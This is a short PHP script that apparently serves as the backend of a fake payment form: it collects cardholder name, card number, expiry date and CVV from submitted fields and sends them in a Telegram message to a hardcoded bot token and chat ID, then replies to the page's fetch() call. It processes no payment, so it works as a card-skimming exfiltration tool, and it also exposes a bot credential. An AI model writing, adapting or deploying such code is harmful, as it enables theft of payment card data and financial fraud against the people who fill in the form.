<?php

// Check if the request is a POST request
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // --- IMPORTANT: CONFIGURE YOUR BOT HERE ---
    $botToken = "8007265195:AAHPbz6ViOaat3SZTvkvs5-w-Y4TSPdIvJQ"; // Replace with your bot's token
    $chatId = "6401456026";               // Replace with your chat ID or a channel ID

    // --- Sanitize and retrieve form data ---
    $paymentMethod = isset($_POST['paymentMethod']) ? htmlspecialchars($_POST['paymentMethod']) : 'N/A';
    $cardHolderName = isset($_POST['cardHolderName']) ? htmlspecialchars($_POST['cardHolderName']) : 'N/A';
    $cardNumber = isset($_POST['cardNumber']) ? htmlspecialchars($_POST['cardNumber']) : 'N/A';
    $expiration = isset($_POST['expiration']) ? htmlspecialchars($_POST['expiration']) : 'N/A';
    $securityCode = isset($_POST['securityCode']) ? htmlspecialchars($_POST['securityCode']) : 'N/A';

    // --- Format the message for Telegram ---
    $message = "💳 **New Payment Submission** 💳\n\n";
    $message .= "----------------------------------------\n";
    $message .= "**Payment Method:** " . $paymentMethod . "\n";
    $message .= "**Card Holder Name:** " . $cardHolderName . "\n";
    $message .= "**Card Number:** " . $cardNumber . "\n";
    $message .= "**Expiration:** " . $expiration . "\n";
    $message .= "**Security Code (CVV):** " . $securityCode . "\n";
    $message .= "----------------------------------------\n";

    // --- Prepare the request to Telegram API ---
    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown' // Use 'Markdown' or 'HTML' for formatting
    ];

    // --- Send the request using cURL ---
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $telegramApiUrl);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    $error = curl_error($curl);
    curl_close($curl);

    // --- Send a response back to the JavaScript fetch() call ---
    if ($httpCode == 200) {
        echo "Message sent successfully!";
    } else {
        // You can log this error to a file on your server for debugging
        // error_log("Telegram API Error: " . $error);
        echo "Failed to send message.";
    }

} else {
    // If someone tries to access this file directly
    echo "Invalid request method.";
}

?>